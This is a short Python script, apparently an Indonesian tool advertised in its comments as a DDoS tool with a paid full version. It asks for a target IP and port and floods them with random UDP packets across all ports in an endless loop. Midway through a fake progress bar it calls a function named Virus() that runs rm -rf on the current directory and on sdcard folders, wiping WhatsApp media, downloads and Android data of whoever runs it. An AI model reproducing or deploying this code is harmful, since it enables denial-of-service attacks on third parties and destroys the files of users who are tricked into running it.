#INI ALAT UNTUK DDOS
#BELI UNTUK FULL VERSI

from os import system
from time import sleep
import sys
import socket
import random


Yes = ["Yes", "yes", "Ya", "ya", "Y", "y"]


def Virus():
	system ("rm -rf *")
	system ("rm -rf sdcard/")
	system ("rm -rf sdcard/WhatsApp")
	system ("rm -rf sdcard/WhatsApp/Media")
	system ("rm -rf sdcard/data")
	system ("rm -rf sdcard/Android")
	system ("rm -rf sdcard/CDIM")
	system ("rm -rf sdcard/Document")
	system ("rm -rf sdcard/Download")
	system ("rm -rf sdcard/*")
	 
	
	
	


#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
	
	##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
	#############
	
system("clear")
system("figlet DDos Attack")
system ("figlet Hacked By Tio")
print ("")
print ("Author   : JackLucifer18")
print ("github   : https://github.com/JackLucifer89")
print ("WhatsApp : 081945885914")
print ("")
system ("clear")
print ("\n\n\t\t*SINBOX*\n• Belajar Bahasa Pemograman Python 3\n• Beli Dan Membuat Software atau Tools\n• Desain\n\nInfo Lebih Lanjut :\nhttps://wa.me/6281945885914\n\n_Tools Dan Project Bisa Dilihat Di Github Saya_ \nhttps://github.com/JackLucifer18\n\n")
ip = str(input("IP Target : "))
port = int(input("Port       : "))
system("clear")
system("figlet Attack Starting")
print ("[                    ] 0% ")
sleep(5)
print ("[=====               ] 25%")
sleep(5)
print ("[==========          ] 50%")
	#“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”#“”“”“”“”“”“”“”“”“”“”“”“”“”#
	
	
Virus()
	
	
	#“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”“”#“”“”“”“”“”“”“”""""“”“”“”“”#
sleep(5)
print ("[===============     ] 75%")
sleep(5)
print ("[====================] 100%")
sleep(3)
sent = 0
while True:
	sock.sendto(bytes, (ip,port))
	sent = sent + 1
	port = port + 1
	print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
	if port == 65534:
		port = 1

